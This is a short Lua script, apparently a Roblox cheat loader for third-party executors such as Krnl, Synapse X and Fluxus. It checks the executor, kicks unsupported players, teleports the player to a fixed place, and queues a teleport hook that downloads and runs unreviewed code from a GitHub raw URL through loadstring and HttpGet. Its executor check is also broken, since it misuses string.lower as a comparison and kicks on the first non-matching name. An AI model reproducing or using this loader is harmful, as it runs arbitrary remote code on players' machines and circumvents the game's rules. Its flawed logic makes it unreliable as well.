local executor = identifyexecutor()
local allowedExecutors = {
    "Krnl",
    "Synapse X",
    "Fluxus"
}
for i,v in pairs(allowedExecutors) do
    if string.lower(executor, v) then
        print('hello')
    else
      game.Players.LocalPlayer:Kick("Not Supported")
    end
end
local queue_on_teleport = syn.queue_on_teleport or queue_on_teleport or krnl and krnl.queue_on_teleport
game:GetService("TeleportService"):Teleport(9952723123, game.Players.LocalPlayer)
queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/asgdahsd/project-mugetsu/main/finalproduct"))()')
